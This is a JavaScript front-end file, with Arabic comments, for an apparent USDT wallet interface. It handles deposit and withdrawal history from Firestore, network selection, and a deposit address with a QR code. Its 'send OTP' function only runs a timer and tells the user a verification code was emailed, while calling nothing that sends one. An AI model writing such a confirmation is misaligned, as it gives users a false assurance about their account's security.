function recRenderList(type,recs){
  recEnsureCss();
  var l=recListEl();if(!l)return;
  var emp=document.querySelector('#rec .remp');
  var list=(recs||[]).filter(function(r){
    if(!r)return false;
    var t=String(r.type||'');
    if(type==='dep')return t==='deposit'||t==='dep';
    if(type==='wd')return t==='withdraw'||t==='wd';
    if(type==='all')return t==='deposit'||t==='dep'||t==='withdraw'||t==='wd';
    return false;
  }).slice().sort(function(a,b){return (Number(b.at)||0)-(Number(a.at)||0);});
  if(!list.length){l.innerHTML='';if(emp)emp.style.display='';return;}
  if(emp)emp.style.display='none';
  var h='';
  list.forEach(function(r){
    var t0=String(r.type||'');
    var amt=Number(r.amount)||0;
    var fee=amt*0.05;
    var rs=r.status?String(r.status):'pending';
    var stTxt='قيد المعالجة',stCls='p';
    if(rs==='approved'||rs==='success'){stTxt='نجاح';stCls='ok';}
    else if(rs==='rejected'||rs==='failed'){stTxt='فشل';stCls='no';}
    h+='<div class="ritm">'
      +'<div class="rst '+stCls+'">'+stTxt+'</div>'
      +'<div class="ram">'+amt.toFixed(8)+' USDT</div>'
      +'<div class="rrw"><span>'+(r.net||'TRC20')+'</span><span>'+wdFmtD(r.at)+'</span></div>'
      +(((type==='wd')||((type==='all')&&(t0==='withdraw'||t0==='wd')))?'<div class="rrw"><span>'+fee.toFixed(8)+'</span><span>الرسوم</span></div>':'')
      +(r.addr?'<div class="rad">'+String(r.addr).replace(/</g,'&lt;')+'</div>':'')
      +'</div>';
  });
  l.innerHTML=h;
}
function recSubscribe(){
  try{
    if(recUnsub){try{recUnsub();}catch(e){}recUnsub=null;}
    if(recType==='addr'){recRenderList('addr',[]);return;}
    if(astFB.ready&&astFB.uid&&astFB.fs){
      var fs=astFB.fs;
      recUnsub=fs.onSnapshot(fs.doc(astFB.db,'users',astFB.uid),function(snap){
        try{
          var d=snap.exists()?(snap.data()||{}):{};
          recRenderList(recType,Array.isArray(d.records)?d.records:[]);
        }catch(e){}
      },function(){});
    }else{
      recRenderList(recType,[]);
      setTimeout(function(){
        var rc=document.getElementById('rec');
        if(rc&&rc.style.display!=='none'&&!recUnsub)recSubscribe();
      },1500);
    }
  }catch(e){}
}
window.recOpen=function(f){
  recType=(f==='dep')?'dep':(f==='wd'?'wd':'all');
  var tabs=document.querySelectorAll('#rec .rtb');
  tabs.forEach(function(t){t.classList.remove('on');});
  var idx=(recType==='dep')?0:(recType==='wd'?1:-1);
  if(idx>=0&&tabs[idx])tabs[idx].classList.add('on');
  recSubscribe();
};
window.recTab=function(el){
  var tabs=Array.prototype.slice.call(document.querySelectorAll('#rec .rtb'));
  var i=tabs.indexOf(el);
  recType=(i===0)?'dep':(i===1?'wd':'addr');
  recSubscribe();
};
window.recClose=function(){
  if(recUnsub){try{recUnsub();}catch(e){}recUnsub=null;}
};

window.wdOpenRecs=function(){
  /* أولاً: استخدام نفس دالة سجل الإيداع الموجودة في الصفحة لعرض طلبات السحب بنفس التصميم حرفياً */
  if(typeof openRec==='function'){
    try{if(wdRecUnsub){try{wdRecUnsub();}catch(e){}wdRecUnsub=null;}
      var _ov=document.getElementById('wdRecOv');if(_ov)_ov.style.display='none';
      openRec('wd');return;
    }catch(e){}
  }
  /* احتياطي فقط إذا لم تكن openRec متوفرة: السجل القديم */
  wdShowRecs([]);
  try{
    if(astFB.ready&&astFB.uid&&astFB.fs){
      var fs=astFB.fs;
      if(wdRecUnsub){try{wdRecUnsub();}catch(e){}wdRecUnsub=null;}
      wdRecUnsub=fs.onSnapshot(fs.doc(astFB.db,'users',astFB.uid),function(snap){
        try{
          var d=snap.exists()?(snap.data()||{}):{};
          var ov=document.getElementById('wdRecOv');
          if(ov&&ov.style.display!=='none')wdShowRecs(Array.isArray(d.records)?d.records:[]);
        }catch(e){}
      },function(){});
    }
  }catch(e){}
};

/* ===== فتح السجل العام (سحب + إيداع معاً) من زر "السجل" في الصفحة الرئيسية للأصول ===== */
window.astOpenAllRec=function(){
  var opened=false;
  if(typeof openRec==='function'){try{openRec('all');opened=true;}catch(e){}}
  if(!opened){
    try{if(typeof hideAll==='function')hideAll();}catch(e){}
    try{var nv=document.querySelector('.nav');if(nv)nv.style.display='none';}catch(e){}
    var rc=document.getElementById('rec');if(rc)rc.style.display='block';
    try{window.scrollTo(0,0);}catch(e){}
  }
  try{recOpen('all');}catch(e){}
};

/* ==================================================================
   ===== قسم الإيداع: عنوان الإيداع + QR (نُقل من الصفحة الأم إلى ملف الأصول) =====
   ================================================================== */
var recHTML='<div class="wdin"><div class="wdt"><div class="pfb" onclick="closeRec()"><img src="https://i.ibb.co/k69JQ9LS/IMG.png" alt="back"></div><h1 data-t="recDep">السجل العام</h1><div class="dsp"></div></div><div class="rlst" id="recLst"></div><div class="remp"><img src="https://gulfxdl.com/assets/empty-light-B1A8k_0V.png" alt=""><p data-t="noData">لا يوجد بيانات</p></div></div>';
var _rc0=document.getElementById('rec');if(_rc0&&!_rc0.innerHTML)_rc0.innerHTML=recHTML;
var AST_NET_FIELD={TRC20:'addr',ERC20:'ERC20',POLYGON:'POLYGON'};
function astNetField(){return AST_NET_FIELD[astNet]||'addr';}
async function loadDepAddr(_r){
  var depEl=document.getElementById('dep');
  if(!depEl||depEl.style.display==='none')return;
  var addrEl=depEl.querySelector('.daddr');
  var qrImg=depEl.querySelector('.dqr img');
  if(!addrEl&&!qrImg)return;
  var field=astNetField();
  var qrBox=depEl.querySelector('.dqr');
  if(qrBox){qrBox.classList.add('busy');if(!qrBox.querySelector('.dqrfx')){var fx=document.createElement('div');fx.className='dqrfx';qrBox.appendChild(fx);}}
  function qrDone(){if(qrBox)qrBox.classList.remove('busy');}
  function applyAddr(a){
    if(addrEl)addrEl.textContent=a;
    var cp=depEl.querySelector('.dcp');
    if(cp)cp.setAttribute('onclick',"cpT('"+String(a).replace(/'/g,'')+"')");
    if(qrImg){qrImg.onload=qrDone;qrImg.onerror=qrDone;qrImg.src='https://api.qrserver.com/v1/create-qr-code/?size=220x220&data='+encodeURIComponent(a);}else qrDone();
  }
  try{var _cAddr=sessionStorage.getItem('astDepAddr:'+field);if(_cAddr){applyAddr(_cAddr);return;}}catch(e){}
  try{
    if(!astFB.ready||!astFB.db||!astFB.fs)throw new Error('not-ready');
    var fs=astFB.fs;
    var aSnap=await fs.getDoc(fs.doc(astFB.db,'addr','addr'));
    var aVal=aSnap.exists()?String(aSnap.data()[field]||''):'';
    if(!aVal)throw new Error('no addr');
    try{sessionStorage.setItem('astDepAddr:'+field,aVal);}catch(e){}
    applyAddr(aVal);
  }catch(e){
    if(e&&e.message==='not-ready'&&(_r||0)<6){setTimeout(function(){loadDepAddr((_r||0)+1)},1000);return;}
    applyAddr('خطأ');
  }
}
window.loadDepAddr=loadDepAddr;
var _openDepAst=window.openDep;
window.openDep=function(){
  if(_openDepAst)_openDepAst();
  /* نفس أسلوب فتح قسم السحب بالضبط */
  try{if(typeof hideAll==='function')hideAll();}catch(e){}
  try{var nv=document.querySelector('.nav');if(nv)nv.style.display='none';}catch(e){}
  var dEl=document.getElementById('dep');if(dEl)dEl.style.display='block';
  try{window.scrollTo(0,0);}catch(e){}
  try{if(typeof flashLd==='function')flashLd();}catch(e){}
  setTimeout(function(){try{astNetSync()}catch(e){}loadDepAddr(0)},80);
};
var _closeDepAst=window.closeDep;
window.closeDep=function(){
  if(_closeDepAst){try{_closeDepAst();}catch(e){}}
  /* نفس أسلوب إغلاق قسم السحب بالضبط */
  try{if(typeof hideAll==='function')hideAll();}catch(e){}
  try{var nv=document.querySelector('.nav');if(nv)nv.style.display='flex';}catch(e){}
  var a=document.getElementById('ast');if(a)a.style.display='block';
  try{if(typeof setNav==='function')setNav(4);}catch(e){}
  try{window.scrollTo(0,0);}catch(e){}
  try{if(typeof flashLd==='function')flashLd();}catch(e){}
};
/* تم حذف مراقب MutationObserver الخاص بقسم الإيداع لأنه كان يسبب تجمد الصفحة عند تبديل الشبكة */
try{if(typeof setLang==='function'&&typeof cur!=='undefined')setLang(cur)}catch(e){}

/* ===== اختيار شبكة الإيداع/السحب: قائمة تظهر من الأسفل (TRC20 / POLYGON / ERC20) + زر إرسال كود التحقق ===== */
var astNet='TRC20';
try{var _astN=sessionStorage.getItem('astNet');if(_astN==='TRC20'||_astN==='POLYGON'||_astN==='ERC20')astNet=_astN;}catch(e){}
function astNetCss(){
  if(document.getElementById('astNetCss'))return;
  var st=document.createElement('style');st.id='astNetCss';
  st.textContent='#astNetOv{position:fixed;inset:0;z-index:999999;background:rgba(0,0,0,.55);display:flex;align-items:flex-end;justify-content:center;direction:ltr;}'
  +'.anets{width:100%;max-width:520px;background:#1c2331;border-radius:18px 18px 0 0;padding:18px 16px 28px;animation:anetup .25s ease;box-shadow:0 -8px 30px rgba(0,0,0,.5);}'
  +'@keyframes anetup{from{transform:translateY(100%)}to{transform:translateY(0)}}'
  +'.anett{color:#fff;font-size:16px;font-weight:700;text-align:center;margin-bottom:12px;}'
  +'.aneti{display:flex;align-items:center;justify-content:space-between;padding:15px 14px;border-radius:12px;color:#e8eef8;font-size:15px;font-weight:600;cursor:pointer;border:1px solid transparent;margin-bottom:6px;}'
  +'.aneti.on{border-color:#3b82f6;background:rgba(59,130,246,.12);}'
  +'.aneti .tick{width:20px;height:20px;stroke:#3b82f6;fill:none;stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round;visibility:hidden;}'
  +'.aneti.on .tick{visibility:visible;}';
  document.head.appendChild(st);
}
function astNetSync(){
  var dv=document.getElementById('dnetV');if(dv&&dv.textContent!=='USDT-'+astNet)dv.textContent='USDT-'+astNet;
  var wv=document.getElementById('wnetV');if(wv&&wv.textContent!==astNet)wv.textContent=astNet;
}
window.astNetSheet=function(which){
  astNetCss();
  var old=document.getElementById('astNetOv');if(old)old.remove();
  var ov=document.createElement('div');ov.id='astNetOv';
  var nets=['TRC20','POLYGON','ERC20'];
  var h='<div class="anets"><div class="anett">اختر الشبكة</div>';
  nets.forEach(function(n){
    h+='<div class="aneti'+(n===astNet?' on':'')+'" onclick="astNetPick(\''+which+'\',\''+n+'\')"><span>'+n+'</span><svg class="tick" viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5"/></svg></div>';
  });
  h+='</div>';
  ov.innerHTML=h;
  ov.addEventListener('click',function(e){if(e.target===ov)ov.remove();});
  document.body.appendChild(ov);
};
window.astNetPick=function(which,n){
  if(n===astNet){var ov0=document.getElementById('astNetOv');if(ov0)ov0.remove();return;}
  astNet=n;
  try{sessionStorage.setItem('astNet',n);}catch(e){}
  astNetSync();
  var ov=document.getElementById('astNetOv');if(ov)ov.remove();
  if(which==='dep'){try{loadDepAddr(0);}catch(e){}}
};
var _astOtpT=null;
window.astSendOtp=function(){
  var b=document.getElementById('wOtpBtn');
  if(!b||b.dataset.busy==='1')return;
  b.dataset.busy='1';
  var s=60;
  b.textContent=s+'s';
  _astOtpT=setInterval(function(){
    s--;
    if(s<=0){clearInterval(_astOtpT);_astOtpT=null;b.dataset.busy='';b.textContent='إرسال';}
    else b.textContent=s+'s';
  },1000);
  try{astToast('تم إرسال كود التحقق إلى بريدك');}catch(e){}
};

/* ===== شريط تنبيه احترافي (توست) بدل تنبيه المتصفح ===== */
(function(){
  if(!document.getElementById('astToastCss')){
    var st=document.createElement('style');
    st.id='astToastCss';
    st.textContent='.astToastBar{position:fixed;left:50%;top:16%;transform:translateX(-50%) translateY(-10px);background:rgba(0,0,0,.78);color:#fff;font-size:14.5px;font-weight:600;font-family:inherit;padding:12px 24px;border-radius:10px;z-index:999999;opacity:0;pointer-events:none;transition:opacity .25s ease,transform .25s ease;max-width:86%;text-align:center;direction:rtl;box-shadow:0 8px 24px rgba(0,0,0,.4);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.astToastBar.on{opacity:1;transform:translateX(-50%) translateY(0)}';
    document.head.appendChild(st);
  }
})();
var _astToastT=null;
function astToast(msg){
  var el=document.getElementById('astToastBar');
  if(!el){el=document.createElement('div');el.id='astToastBar';el.className='astToastBar';document.body.appendChild(el);}
  el.textContent=String(msg);
  el.classList.remove('on');
  void el.offsetWidth;
  el.classList.add('on');
  if(_astToastT){clearTimeout(_astToastT);_astToastT=null;}
  _astToastT=setTimeout(function(){el.classList.remove('on');},2200);
}
window.astToast=astToast;
